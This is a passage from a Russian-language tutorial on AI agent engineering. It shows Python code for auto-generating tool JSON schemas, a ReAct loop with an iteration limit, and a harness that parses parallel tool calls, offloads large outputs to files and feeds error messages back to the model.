 # 1. Извлечение Docstring
 raw_docstring = inspect.getdoc(func)
 if not raw_docstring:
 raise ValueError(f"CRITICAL ERROR: Tool '{tool_name}' lacks a docstring.")
 
 main_description = raw_docstring.split(":param").strip()
 param_descriptions = _parse_docstring_params(raw_docstring)
 
 # 2. Извлечение сигнатуры
 sig = inspect.signature(func)
 properties = {}
 required_params = []
 
 for param_name, param in sig.parameters.items():
 if param.annotation == inspect.Parameter.empty:
 raise TypeError(f"ERROR: Parameter '{param_name}' lacks type hints.")
 
 properties[param_name] = {
 "type": _python_to_json_type(param.annotation),
 "description": param_descriptions.get(param_name, f"Parameter {param_name}")
 }
 
 if param.default == inspect.Parameter.empty:
 required_params.append(param_name)
 
 # 3. Сборка JSON Schema
 schema = {
 "type": "function",
 "function": {
 "name": tool_name,
 "description": main_description,
 "parameters": {
 "type": "object",
 "properties": properties,
 "required": required_params,
 "additionalProperties": False
 }
 }
 }
 
 self._tools[tool_name] = {"callable": func, "schema": schema}
 logging.info(f"Dynamically generated schema for '{tool_name}'.")
 
 @wraps(func)
 def wrapper(*args, **kwargs):
 return func(*args, **kwargs)
 return wrapper
 return decorator

 def get_manifest(self) -> list:
 return [t["schema"] for t in self._tools.values()]
```

#### Шаг 3: Тестирование динамической генерации
Применим наш декоратор к бизнес-логике. 

```python
registry = DynamicToolRegistry()

@registry.tool()
def search_crm(email: str, include_history: bool = False) -> str:
 """
 Searches the CRM system for a specific customer by email.
 Use this tool to retrieve lifetime value (LTV) and account status.:param email: The exact email address of the customer.:param include_history: Whether to fetch past purchase history.
 """
 return f"CRM data for {email}."

if __name__ == "__main__":
 import json
 print(json.dumps(registry.get_manifest(), indent=2))
```

Когда скрипт запускается, он выводит идеальный JSON манифест, который напрямую вставляется в API OpenAI или Anthropic. Разработчику больше никогда не придется писать JSON-инструкции вручную.

---

### Реальные бизнес-применения и юнит-экономика

Переход на динамические схемы радикально меняет скорость разработки (Developer Velocity).

**1. Создание кастомных нод для n8n**
Интеграция ИИ-агентов в платформы визуального программирования (например, n8n) стала стандартом. Статья на Хабре «Пишем свою ноду в n8n под любой API за вечер» подтверждает, что разработчики часто создают микросервисы для расширения базового функционала n8n. Если вы пишете 50 Python-функций для сложного процесса, вам не нужно вручную прописывать интерфейс каждой ноды. Ваш `DynamicToolRegistry` может отдавать готовый манифест схем через REST API, который n8n автоматически распарсит и превратит в удобные визуальные поля ввода для конечного пользователя.

**2. Интеграция с MCP (Model Context Protocol)**
По мере усложнения агентов, они переходят на MCP для изолированного выполнения кода. Динамическая генерация схем позволяет вашему Python-серверу мгновенно становиться валидным MCP-сервером. Вы просто декорируете свои локальные функции базой данных, и любая модель, поддерживающая MCP (например, Claude Code), немедленно получает к ним доступ со всеми типами и правилами валидации.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Генерация схем из кода - это архитектурный паттерн, требующий строгой дисциплины.

> [!CAUTION] 
> **Иллюзия опциональности (Missing Defaults)** 
> **Ошибка:** Разработчик пишет `def create_ticket(title: str, priority: str):` и забывает указать `priority: str = "low"`. Парсер делает оба поля обязательными (`required`). LLM, пытаясь создать тикет без приоритета, галлюцинирует случайный приоритет, чтобы удовлетворить строгую JSON-схему. 
> **Harness Mitigation:** Архитектор должен проектировать функции с четким пониманием ACI (Agent-Computer Interface). Если параметр опционален для бизнес-логики, он обязан иметь значение по умолчанию в Python.

> [!WARNING] 
> **Слепые зоны типизации (Typeless Fallback)** 
> **Проблема:** Если функция определена как `def process_data(payload):`, LLM не знает, что передавать. Обвязка должна выкидывать исключение `TypeError` прямо во время запуска, заставляя инженера исправить код до начала сессии. Как сказано в Лекции 01, сильные модели не означают надёжного исполнения - модель не угадает ваш замысел без строгой схемы.

> [!NOTE] 
> **Самовосстановление (Diagnostic Loop)** 
> Даже с идеальной схемой модель может ошибиться при вызове инструмента. В Лекции 11 указано: «без наблюдаемости агенты принимают решения в условиях неопределённости... ретраи превращаются в слепое блуждание». Если LLM передает невалидные данные, ваш инструмент не должен крашиться. Лекция 10 дает четкое правило: «сообщения об ошибках для агентов должны включать инструкции по исправлению». Инструмент должен перехватить ошибку `Pydantic ValidationError` и вернуть строку: `"Tool Error: Missing parameter 'email'. Please review the tool schema and try again."` Это запускает цикл автокоррекции.

Обернув ваши функции в кастомный декоратор `@tool`, вы создали самодокументирующуюся когнитивную архитектуру. Ваш репозиторий стал единственным источником истины, а инструменты вашего агента всегда идеально синхронизированы с вашим рабочим кодом.

Готовы ли вы перейти к Блоку 8, где мы рассмотрим, как этот реестр инструментов интегрируется в цикл маршрутизации LLM?

---

## Блок 8: Логика канонического цикла рассуждений ReAct (Think -> Act -> Observe).

Вы прошли долгий путь. Вы освоили динамическую генерацию JSON-схем, научились оборачивать инструменты в безопасные изолированные микросервисы FastAPI, реализовали строгую валидацию через Pydantic V2 и построили песочницы для безопасного выполнения кода. У вас есть «руки», «глаза» и «инструменты». Но до этого момента они лежали без дела. 

Пришло время создать «мозг».

В Фазе 1 роадмапа AI-инженера стоит абсолютно четкая задача: написать канонический цикл агента с нуля в ~100 строк, чтобы понять, как завершается цикл запрос/ответ, что значат разные `stop_reason` и как кодируются параллельные вызовы. Как справедливо отмечается в руководстве по созданию AI-агентов на 2026 год: «Агент – это НЕ магия. Это цикл: LLM думает, выбирает инструмент, инструмент выполняется, результат возвращается в промпт, повторяем до завершения задачи». 

В этом исчерпывающем, монументальном глубоком погружении мы демистифицируем ИИ-агентов. Мы разберем канонический паттерн ReAct (Reason + Act), спроектируем систему управления историей сообщений, реализуем защиту от бесконечных циклов и построим детерминированный `while True` цикл, который оживит вашу когнитивную архитектуру.

---

### Глубокий теоретический анализ: Демистификация магии агентов

Прежде чем писать ядро нашего агента, мы должны концептуально разрушить иллюзию «искусственного интеллекта» и свести ее к строгой инженерии программного обеспечения (Harness Engineering).

#### 1. Паттерн ReAct (Reason + Act)
Как объясняется в whitepaper от Google, паттерн ReAct работает путем объединения рассуждений и действий в единую петлю (thought-action loop). Традиционные языковые модели генерировали текст в один проход. Агент ReAct работает иначе:
* **Think (Рассуждение):** Сначала LLM анализирует проблему и генерирует план действий. Она выводит свои мысли в текстовом виде (Chain-of-Thought), что позволяет ей структурировать логику.
* **Act (Действие):** На основе своих рассуждений модель принимает решение использовать конкретный инструмент (например, `search_database` или `run_python_code`).
* **Observe (Наблюдение):** Инструмент выполняется в вашей Python-обвязке (Harness), и результат возвращается модели. Модель использует эти наблюдения, чтобы обновить свои рассуждения и сгенерировать следующий шаг. Этот процесс продолжается до тех пор, пока модель не достигнет решения.

#### 2. Агент как `while True` цикл
Если отбросить маркетинговую мишуру, реализация агента тривиальна. В статье на Хабре «Claude Code в 2026: гайд для тех, кто еще пишет код руками» Даниил Охлопков констатирует: «Любой агент - это просто `while true` цикл, который берет твой ввод и «продолжает» его с помощью LLM. Если в ответе есть запрос на вызов инструмента (tool), то вызываем и результат отправляем обратно в llm. Repeat». Вся интеллектуальная работа заключается в том, как вы управляете массивом сообщений (Context Engineering) внутри этого цикла. 

#### 3. Анатомия `stop_reason` (Причины остановки)
Ваш Python-код должен точно знать, почему LLM прекратила генерацию. Современные API (Anthropic, OpenAI) возвращают специальные флаги. Как требует Фаза 1 роадмапа, вы должны понимать, как обрабатывать эти флаги:
* `tool_use` (или `tool_calls`): Модель приостановила генерацию, потому что ей нужны данные из реального мира. Ваш скрипт должен перехватить управление, выполнить инструмент и вернуть `tool_result`.
* `end_turn` (или `stop`): Модель решила, что задача полностью выполнена, и сгенерировала финальный ответ пользователю.
* `max_tokens` (или `length`): Модель уперлась в лимит токенов генерации. Требуется техническое вмешательство (Diagnostic Loop).

#### 4. Проблема Verification Gap и преждевременного успеха
Даже с идеальным циклом модель будет ошибаться. В Лекции 01 курса курс по Harness-инженерии вводится понятие **Verification Gap** - это разрыв между уверенностью агента в своей работе и реальной корректностью. Агент говорит «я закончил», когда на самом деле он не закончил. В Лекции 09 подчеркивается, что суждение о завершении задачи должно быть экстернализировано - harness (ваша обвязка) верифицирует результаты независимо, нельзя просто доверять «чувствам» агента.

---

### Архитектурная схема ASCII: Механика канонического цикла ReAct

Следующий направленный ациклический граф (DAG) детально иллюстрирует, как массив сообщений мутирует и растет на каждой итерации цикла `while True`.

```ascii
=============================================================================================
 ENTERPRISE ReAct LOOP ARCHITECTURE (THINK -> ACT -> OBSERVE)
=============================================================================================

[ 1. INITIALIZATION ]
messages = [
 {"role": "system", "content": "You are a senior data engineer..."},
 {"role": "user", "content": "Find the total revenue for Q3 and plot it."}
]
 |
+=============================V===========================================================+
| WHILE loop_count < MAX_ITERATIONS (e.g., 15) |
+=========================================================================================+
| |
| [ 2. LLM INFERENCE (THINK) ] |
| -> Send `messages` + `tools_schema` to API. |
| <- Receive `response` with `stop_reason`. |
| |
| [ 3. APPEND ASSISTANT RESPONSE TO CONTEXT ] |
| -> messages.append({"role": "assistant", "content": response.content}) |
| |
| [ 4. EVALUATE `stop_reason` ] |
| |
| IF `stop_reason` == 'end_turn': IF `stop_reason` == 'tool_use': |
| +--------------------------------+ +---------------------------------+ |
| | [ 5A. TERMINATION ] | | [ 5B. EXECUTION (ACT) ] | |
| | Task complete. | | Parse `tool_name` & `args`. | |
| | BREAK `while` loop. | | Execute local Python function. | |
| | Return final text to user. | | Generate raw output/error. | |
| +--------------------------------+ +---------------------------------+ |
| | |
| +---------------------------------+ |
| | [ 6. OBSERVATION INJECTION ] | |
| | Format output as `tool_result`. | |
| | Append to `messages` as `user`: | |
| | {"role": "user", | |
| | "content": "Tool Output..."} | |
| +---------------------------------+ |
| | |
+=====================================================================V===================+
 [ CONTINUES LOOP ]
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Как предписано в Фазе 1 («Первый простой агент»), один раз написав этот цикл в ~100 строк кода, вы сделаете любой фреймворк читаемым. Мы реализуем отказоустойчивый цикл ReAct, используя абстракцию словарей сообщений.

#### Шаг 1: Подготовка инструментов и состояния (State Management)
Наш цикл должен динамически находить инструменты, обрабатывать их вызовы и управлять массивом контекста. Мы будем использовать реестр инструментов, созданный в предыдущих блоках.

```python
import os
import json
import logging
from typing import List, Dict, Any

# "Без наблюдаемости агенты принимают решения в условиях неопределённости" 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [ReAct_LOOP] - %(message)s')

class ReActAgent:
 """
 Каноническая реализация цикла Reason + Act.
 Управляет состоянием сообщений, диспетчеризацией инструментов и защитой от бесконечных петель.
 """
 def __init__(self, tool_registry, system_prompt: str, max_iterations: int = 15):
 # Инициализируем LLM клиент (псевдокод для OpenAI/Anthropic SDK)
 from openai import OpenAI
 self.client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
 
 self.tool_registry = tool_registry
 self.system_prompt = system_prompt
 # "Установите лимит итераций (обычно 10–15), чтобы агент никогда не зацикливался навсегда" 
 self.max_iterations = max_iterations
 self.messages: List[Dict[str, Any]] = []

 def _get_llm_response(self) -> Any:
 """Сетевой вызов к языковой модели с передачей динамических JSON-схем."""
 try:
 return self.client.chat.completions.create(
 model="gpt-4o",
 messages=[{"role": "system", "content": self.system_prompt}] + self.messages,
 # Получаем манифест инструментов из Блока 7
 tools=self.tool_registry.get_manifest(), 
 temperature=0.2 # Низкая температура для аналитических задач
 )
 except Exception as e:
 logging.error(f"Network Failure: {str(e)}")
 raise
```

#### Шаг 2: Реализация ядра `while True` (The Engine)
Это сердце искусственного интеллекта. Цикл, который переводит статический промпт в динамическое агентное поведение.

```python
 def run(self, user_query: str) -> str:
 """Запускает автономный цикл рассуждений и действий для решения задачи пользователя."""
 
 # 1. Инициализация сессии
 self.messages.append({"role": "user", "content": user_query})
 iterations = 0
 
 logging.info(f"Начало выполнения задачи: '{user_query}'")

 # "Любой агент — это просто while true цикл..." 
 while iterations < self.max_iterations:
 iterations += 1
 logging.info(f"--- Итерация {iterations}/{self.max_iterations} ---")
 
 # 2. Фаза Рассуждения (THINK)
 response = self._get_llm_response()
 message_obj = response.choices[0].message
 
 # Сохраняем мысли модели (Chain-of-Thought) в контекст для непрерывности
 if message_obj.content:
 logging.info(f"Agent Thought: {message_obj.content}")
 
 self.messages.append(message_obj.model_dump(exclude_none=True))
 
 # 3. Маршрутизация по причине остановки (stop_reason logic)
 # Если модель решила, что инструментов больше не нужно, она возвращает текст
 if not message_obj.tool_calls:
 logging.info("Agent declared end_turn. Задача завершена.")
 return message_obj.content

 # 4. Фаза Действия (ACT)
 # Модель запросила вызов одного или нескольких инструментов (параллельные вызовы) 
 tool_results_payload = []
 
 for tool_call in message_obj.tool_calls:
 tool_name = tool_call.function.name
 tool_args_str = tool_call.function.arguments
 tool_id = tool_call.id
 
 logging.info(f"ACT: Executing tool '{tool_name}' with args: {tool_args_str}")
 
 try:
 # Парсинг аргументов
 args_dict = json.loads(tool_args_str)
 
 # Безопасное выполнение (песочница из Блока 6 / Pydantic из Блока 7)
 raw_result = self.tool_registry.execute(tool_name, **args_dict)
 
 # 5. Фаза Наблюдения (OBSERVE)
 observation = str(raw_result)
 logging.info(f"OBSERVE: Tool success. Output length: {len(observation)} chars.")
 
 except Exception as e:
 # Diagnostic Loop: Сообщения об ошибках должны включать инструкции 
 observation = (
 f"TOOL EXECUTION ERROR: {str(e)}\n"
 f"Инструкция по исправлению: Проверьте правильность переданных аргументов. "
 f"Если ошибка синтаксическая, перепишите запрос."
 )
 logging.warning(f"Trapped error in tool '{tool_name}'. Fed back to LLM.")

 # Формируем ответ от инструмента в строгом формате для LLM
 tool_results_payload.append({
 "tool_call_id": tool_id,
 "role": "tool",
 "name": tool_name,
 "content": observation
 })
 
 # Внедряем результаты ВСЕХ параллельных вызовов обратно в контекст
 self.messages.extend(tool_results_payload)
 
 # 6. Обработка краевых случаев (Infinite Loop Trap)
 error_msg = f"КРИТИЧЕСКАЯ ОШИБКА: Превышен лимит итераций ({self.max_iterations}). Агент зациклился."
 logging.critical(error_msg)
 return error_msg
```

Этот код, занимающий менее 100 строк логики, является абсолютным архитектурным эквивалентом таких фреймворков, как LangChain, CrewAI или AutoGen. Понимание этого цикла - это то, что отличает инженера от простого пользователя API.

---

### Реальные бизнес-применения и юнит-экономика

Цикл ReAct фундаментально меняет юнит-экономику автоматизации, переводя ИИ из режима чат-бота в режим автономного сотрудника.

**1. Интеллектуальный агент поддержки (Tier 1 Resolution)**
Как описывается в руководстве *карта развития ИИ-Инженера*, агенты идеально подходят для замены линий поддержки Tier 1. Когда поступает сложный email от клиента, обычный скрипт автоматизации не справится, если данных не хватает. Агент в цикле ReAct сначала выполнит *Рассуждение* («Мне нужен ID клиента, чтобы проверить статус заказа»), затем *Действие* (вызов инструмента `search_crm_by_email`), получит *Наблюдение* (JSON с данными заказа), снова выполнит *Рассуждение* («Заказ задерживается на складе, нужно извиниться и предложить скидку») и только затем сгенерирует *Действие* `send_email_reply`. Этот многошаговый цикл позволяет решать 70% тикетов без участия человека, снижая операционные расходы на десятки тысяч долларов.

**2. Глубокий исследовательский аналитик (Research Analyst Deep Agent)**
В Фазе 2 роадмапа описывается паттерн «research analyst». Человек формулирует сложный вопрос (например, «Собери аналитику по конкурентам в нише X»). Агент ReAct начинает цикл: он вызывает `web_search`, читает результаты, понимает, что информации недостаточно, вызывает поиск с новыми ключевыми словами, скачивает PDF-отчеты через инструмент `read_document`, суммаризирует их и только после 8-10 итераций `while` цикла (когда собрано достаточно данных) формирует финальный документ. «Эталонная архитектура orchestrator-worker дает прирост 90,2% на breadth-first research».

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Управление автономными `while` циклами, в которых происходят платные вызовы API - это управление ракетой. Без строгих ограничений (Harness) она неизбежно взорвется.

> [!CAUTION] 
> **Ловушка бесконечного цикла (Doom Loop)** 
> **Ошибка:** Агент пытается вызвать инструмент с неверным аргументом. Инструмент возвращает ошибку. Агент, не понимая, как ее исправить, вызывает инструмент *с тем же самым неверным аргументом* снова. Цикл повторяется бесконечно, сжигая сотни долларов на API за минуты. 
> **Harness Mitigation:** Именно поэтому в коде мы жестко задали `while iterations < self.max_iterations`. Как строго предписано: «Установите лимит итераций (обычно 10–15), чтобы агент никогда не зацикливался навсегда». По достижении лимита цикл принудительно обрывается и эскалирует проблему на человека.

> [!WARNING] 
> **Переполнение контекста (Context Bloat / Token Explosion)** 
> **Проблема:** На шаге *Наблюдения* инструмент веб-скрапинга возвращает агенту HTML-код страницы длиной в 100 000 токенов. Мы делаем `self.messages.extend()`. На следующей итерации агент делает еще один поиск, и мы добавляем еще 100 000 токенов. Контекстное окно (и бюджет) мгновенно переполняются. 
> **Диагностическая петля:** Архитектор обязан реализовать компакцию и управление контекстом. «ReAct prompting in practice requires understanding that you continually have to resend the previous prompts/responses (and do trimming of the extra generated content)». Вместо возврата сырого HTML, инструмент должен возвращать урезанный текст (до 2000 токенов), либо сохранять огромный результат в виртуальную файловую систему и возвращать агенту только путь к файлу (паттерн Filesystem Offload).

> [!NOTE] 
> **Иллюзия завершения (Verification Gap)** 
> Агенты систематически сверх-уверены. Модель может вернуть `end_turn` и сказать: «Я успешно обновила базу данных», хотя инструмент записи даже не вызывался (модель просто сгаллюцинировала успех). 
> Решение: Сквозная верификация. Ваш Harness не должен доверять `stop_reason` слепо. Перед тем как отдать результат пользователю, внешняя система (команды верификации) должна проверить, действительно ли изменения применены. «Только сквозной прогон - настоящая проверка».

Овладев логикой цикла ReAct, вы собрали все элементы воедино. Ваш агент теперь может мыслить, использовать динамические схемы инструментов, безопасно выполнять код в песочницах и восстанавливаться после ошибок Pydantic - и всё это внутри единого, контролируемого и наблюдаемого цикла.

Вы официально стали Архитектором ИИ-Автоматизаций. Готовы ли вы запустить этот цикл в реальной среде и посмотреть, как ваш агент выполняет свою первую автономную задачу?

---

## Блок 9: Парсинг структуры вызовов инструментов (tool_calls) и возврат результатов в историю.

В предыдущем блоке мы концептуализировали ядро ИИ-агента, осознав фундаментальную истину индустрии: «Любой агент - это просто `while true` цикл, который берет твой ввод и «продолжает» его с помощью LLM». Однако, когда модель принимает решение о взаимодействии с физическим миром, она не может «нажать кнопку» или «выполнить скрипт». Единственный доступный ей интерфейс - это генерация структурированного текста. 

В Фазе 1 фундаментального роадмапа AI-инженера строго зафиксирована механика этого процесса: «Вы вызываете модель с сообщениями и инструментами, парсите блоки `tool_use`, исполняете инструменты, прицепляете `tool_result`, повторяете, пока `stop_reason == end_turn`». Именно здесь, в слое парсинга и возврата результатов (Observation Injection), происходит трансформация языковой модели из генератора вероятностного текста в детерминированный вычислительный движок.

В этом исчерпывающем, продакшн-ориентированном глубоком погружении мы детально разберем анатомию Agent-Computer Interface (ACI). Мы спроектируем систему перехвата вызовов (`tool_calls`), напишем парсеры для безопасного извлечения аргументов, реализуем паттерн Filesystem Offload для управления огромными ответами и научимся форматировать историю сообщений так, чтобы архитектура внимания (Attention Mechanism) трансформера не разрушилась от потери контекста.

---

### Глубокий теоретический анализ: Физика Agent-Computer Interface (ACI)

Чтобы построить надежную обвязку (Harness), архитектор должен математически понимать, как провайдеры API (OpenAI, Anthropic, Google) структурируют запросы на выполнение кода. 

#### 1. Иллюзия действия и семантический разрыв
Модель не выполняет инструменты. Когда LLM доходит до узла принятия решения (Think) и понимает, что ей нужны внешние данные (например, текущая погода или результат SQL-запроса), она прерывает стандартную текстовую генерацию. API возвращает специальный объект (часто обозначаемый `stop_reason: tool_use` или `finish_reason: tool_calls`), содержащий название запрошенной функции и сгенерированные JSON-аргументы.
Ваш Python-код обязан:
1. Распознать этот сигнал остановки.
2. Приостановить LLM (не отправлять новые запросы).
3. Извлечь JSON-строку, распарсить ее и передать в реальную Python-функцию.
4. Дождаться ответа физического мира (stdout песочницы, HTTP-ответ от внешнего API).

#### 2. Бимодальная структура памяти (ID-связывание)
Самая критическая концепция при возврате результатов в историю - это поддержание криптографической связности через ID. Языковая модель может запросить выполнение трех инструментов параллельно (Parallel Tool Calling). Когда вы возвращаете результаты в массив `messages`, модель должна точно знать, какой результат какому запросу принадлежит.
Оба ведущих провайдера требуют строгой связки:

| Провайдер | Тип запроса от LLM | ID вызова | Роль для ответа (Возврат в историю) |
|:--- |:--- |:--- |:--- |
| **OpenAI** | `message.tool_calls` | `tool_call.id` | `{"role": "tool", "tool_call_id": id, "content": "..."}` |
| **Anthropic** | `content_block.type == 'tool_use'` | `block.id` | `{"role": "user", "content": [{"type": "tool_result", "tool_use_id": id,...}]}` |

Если вы отправите результат, перепутав ID или забыв его указать, API мгновенно вернет `HTTP 400 Bad Request`, разрушив сессию.

#### 3. Паттерн "Filesystem Offload" и управление контекстом
Инструменты часто возвращают гигантские объемы данных. Если агент вызывает инструмент `scrape_website`, результат может содержать 50 000 токенов HTML-кода. Слепое добавление этого вывода в историю (`messages.append(...)`) мгновенно приведет к исчерпанию контекстного окна (Context Bloat).
Роадмап AI-инженера диктует жесткий архитектурный паттерн для обвязок: «Filesystem offload: любой результат инструмента >20K токенов пишется в./workspace/<id>.txt, в контексте остается путь и preview из 10 строк». Ваш парсер должен интеллектуально оценивать размер `tool_result` перед инъекцией в память.

---

### Архитектурная схема ASCII: Инъекция наблюдений (Observation Injection)

Следующий направленный ациклический граф (DAG) иллюстрирует конвейер обработки, в котором сырой ответ LLM перехватывается, параллельно исполняется, и результаты безопасно интегрируются обратно в память агента.

```ascii
=============================================================================================
 ENTERPRISE TOOL PARSING & INJECTION HARNESS
=============================================================================================

[ 1. LLM API RESPONSE ]
`finish_reason`: "tool_calls"
`message`: {
 "role": "assistant",
 "tool_calls": [
 {"id": "call_abc1", "function": {"name": "fetch_db", "arguments": "{\"id\": 5}"}},
 {"id": "call_xyz9", "function": {"name": "search_web", "arguments": "{\"q\": \"AI\"}"}}
 ]
}
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. HARNESS PARSING LAYER (Python Dispatcher) |
| -> Append `message` to internal `messages` history (CRITICAL: Must store the calls) |
| -> Loop through `tool_calls` array. |
+-----------------------------------------------------------------------------------------+
 / (Thread 1) \ (Thread 2)
 v v
[ 3A. EXECUTE `fetch_db` ] [ 3B. EXECUTE `search_web` ]
- Validate JSON arguments. - Validate JSON arguments.
- Execute local Python function. - Execute HTTP request.
- Result: "User 5 is Active." - Result: 100,000 tokens of HTML.
 | |
 v v
+-----------------------------------------------------------------------------------------+
| 4. OBSERVATION FORMATTER & CONTEXT COMPACTION |
| |
| [ 4A. Small Payload ] [ 4B. Massive Payload ] |
| -> Format as standard `tool_result`. -> Trigger Filesystem Offload. |
| -> Write HTML to `workspace/doc.txt`. |
| -> Format preview string. |
+-----------------------------------------------------------------------------------------+
 |
 v
[ 5. HISTORY INJECTION ]
`messages.extend([
 {"role": "tool", "tool_call_id": "call_abc1", "content": "User 5 is Active."},
 {"role": "tool", "tool_call_id": "call_xyz9", "content": "Saved to workspace/doc.txt."}
])`
 |
 v
[ 6. RESUME ReAct LOOP ] -> Send updated `messages` array back to LLM to continue reasoning.
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем production-ready парсер для обработки `tool_calls` в стиле OpenAI API. Этот код будет включать встроенную защиту от галлюцинаций JSON, параллельное выполнение и управление контекстом через Filesystem Offload.

#### Шаг 1: Инициализация менеджера истории и среды
Согласно Лекции 11 («Сделайте рантайм агента наблюдаемым»), мы должны интегрировать подробное логирование в каждый шаг парсинга.

```python
import json
import logging
import os
import concurrent.futures
from typing import List, Dict, Any

# Настройка наблюдаемости рантайма
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [TOOL_PARSER] - %(message)s')

class ToolExecutionHarness:
 """
 Энтерпрайз-обвязка для парсинга вызовов инструментов, их выполнения
 и безопасного возврата результатов в историю контекста LLM.
 """
 def __init__(self, tool_registry: Dict[str, callable], workspace_dir: str = "./workspace"):
 self.tool_registry = tool_registry
 self.workspace_dir = workspace_dir
 os.makedirs(self.workspace_dir, exist_ok=True)
 self.max_tokens_threshold = 20000 # Примерный лимит символов для Offload
```

#### Шаг 2: Реализация паттерна Filesystem Offload и Diagnostic Loop
Инструменты могут падать. Когда это происходит, согласно Лекции 10, «сообщения об ошибках для агентов должны включать инструкции по исправлению». Мы не можем позволить `Exception` обрушить наш Python-процесс.

```python
 def _execute_single_tool(self, tool_call: Any) -> Dict[str, Any]:
 """
 Изолированно выполняет один вызов инструмента с защитой от сбоев
 и компакцией ответа.
 """
 tool_id = tool_call.id
 func_name = tool_call.function.name
 raw_args = tool_call.function.arguments
 
 logging.info(f"Parsing tool execution request: {func_name} | ID: {tool_id}")
 
 try:
 # 1. Защита от галлюцинаций JSON
 args_dict = json.loads(raw_args)
 
 # 2. Проверка наличия инструмента в реестре
 if func_name not in self.tool_registry:
 error_msg = (
 f"SYSTEM ERROR: Tool '{func_name}' is not registered in the harness. "
 f"INSTRUCTION: Do not attempt to call this tool again. Choose from available tools."
 )
 logging.warning(error_msg)
 return {"role": "tool", "tool_call_id": tool_id, "content": error_msg}
 
 # 3. Физическое выполнение инструмента
 executable_func = self.tool_registry[func_name]
 raw_result = executable_func(**args_dict)
 observation_str = str(raw_result)
 
 # 4. Filesystem Offload для гигантских ответов 
 if len(observation_str) > self.max_tokens_threshold:
 offload_path = os.path.join(self.workspace_dir, f"{tool_id}_result.txt")
 with open(offload_path, "w", encoding="utf-8") as f:
 f.write(observation_str)
 
 # Формируем preview (первые 10 строк)
 preview_lines = "\n".join(observation_str.split("\n")[:10])
 observation_str = (
 f"[SYSTEM COMPACTION INITIATED]\n"
 f"The tool output was too large ({len(observation_str)} chars) and has been offloaded to the filesystem.\n"
 f"File path: {offload_path}\n"
 f"--- PREVIEW (First 10 lines) ---\n"
 f"{preview_lines}\n"
 f"--- END PREVIEW ---\n"
 f"INSTRUCTION: If you need the full data, use the 'read_file' tool on the path provided."
 )
 logging.info(f"Filesystem offload triggered for {tool_id}. Saved to {offload_path}")
 
 return {"role": "tool", "tool_call_id": tool_id, "content": observation_str}

 except json.JSONDecodeError:
 # Diagnostic Loop: Инструкция по исправлению 
 error_msg = (
 f"JSON DECODE ERROR: The arguments you provided ('{raw_args}') are not valid JSON. "
 f"INSTRUCTION: Please reflect on your syntax, escape quotes properly, and retry the tool call."
 )
 logging.error(f"JSON Error in {tool_id}")
 return {"role": "tool", "tool_call_id": tool_id, "content": error_msg}
 
 except Exception as e:
 error_msg = (
 f"RUNTIME ERROR during '{func_name}' execution: {str(e)}\n"
 f"INSTRUCTION: Analyze the error stack trace. Modify your arguments or approach."
 )
 logging.error(error_msg)
 return {"role": "tool", "tool_call_id": tool_id, "content": error_msg}
```

#### Шаг 3: Оркестрация параллельных вызовов и интеграция в цикл
Этот метод вызывается из основного `while True` цикла агента. Он параллельно обрабатывает все запрошенные инструменты и возвращает массив сообщений, готовый к добавлению в `messages`.

```python
 def process_tool_calls(self, message_with_tools: Any) -> List[Dict[str, Any]]:
 """
 Главный оркестратор парсинга. Принимает ответ LLM, обрабатывает
 все параллельные вызовы через ThreadPool и возвращает форматированный контекст.
 """
 tool_calls = message_with_tools.tool_calls
 if not tool_calls:
 return []
 
 logging.info(f"Processing {len(tool_calls)} parallel tool calls.")
 
 results_payload = []
 
 # Выполнение инструментов параллельно для минимизации задержек (Latency)
 with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
 future_to_call = {executor.submit(self._execute_single_tool, call): call for call in tool_calls}
 for future in concurrent.futures.as_completed(future_to_call):
 result_message = future.result()
 results_payload.append(result_message)
 
 # API требует, чтобы порядок tool_results не обязательно совпадал с порядком tool_calls,
 # так как связка происходит строго по tool_call_id.
 return results_payload

# ==========================================
# Пример использования в контексте ReAct Цикла
# ==========================================
if __name__ == "__main__":
 # Фиктивный реестр из Блока 7
 registry = {
 "calculate_metrics": lambda dataset: "Metrics: ROI 15%, Churn 2%",
 "fetch_logs": lambda server_id: "Extremely long log payload..." * 5000 # Спровоцирует Offload
 }
 
 harness = ToolExecutionHarness(tool_registry=registry)
 
 # Симуляция ответа от OpenAI API
 class MockFunction:
 def __init__(self, name, args):
 self.name = name
 self.arguments = args
 
 class MockCall:
 def __init__(self, tid, name, args):
 self.id = tid
 self.function = MockFunction(name, args)
 
 class MockMessage:
 def __init__(self):
 self.tool_calls = [
 MockCall("call_111", "calculate_metrics", '{"dataset": "Q3"}'),
 MockCall("call_222", "fetch_logs", '{"server_id": "prod-db"}'),
 MockCall("call_333", "unknown_tool", '{}') # Проверка обработки ошибок
 ]
 
 simulated_llm_response = MockMessage()
 
 # 1. LLM вернула запрос на инструменты. Мы пропускаем его через Харнесс:
 observation_messages = harness.process_tool_calls(simulated_llm_response)
 
 print("\n--- INJECTABLE OBSERVATION CONTEXT ---")
 print(json.dumps(observation_messages, indent=2))
 
 # 2. В реальном коде вы сделаете:
 # messages.append(simulated_llm_response_dict) # Обязательно сохраните запросы
 # messages.extend(observation_messages) # Верните ответы
 # client.chat.completions.create(messages=messages...) # Продолжите цикл
```

---

### Реальные бизнес-применения и юнит-экономика

Освоение парсинга инструментов и компакции контекста отличает хрупкие прототипы от неубиваемых энтерпрайз-систем.

**1. Масштабный Web Scraping в no-code платформах (n8n)**
В руководствах по n8n (например, "Scrape ANY Website with n8n!" ) часто используется нода HTTP-запроса, за которой следует AI-агент. Если агент решает перейти по 5 ссылкам конкурентов одновременно, он сгенерирует 5 параллельных `tool_calls`. Без паттерна многопоточного парсинга и Filesystem Offload, попытка вставить 5 HTML-страниц (каждая по 80 000 токенов) обратно в историю n8n мгновенно превысит лимит токенов GPT-4o (128k) и вызовет фатальный `HTTP 400 BadRequest`. Реализуя логику отсечения `max_tokens_threshold`, вы гарантируете, что рабочий процесс (workflow) никогда не упадет, независимо от размера загружаемых данных.

**2. Мульти-Агентные исследовательские системы (Research Analysts)**
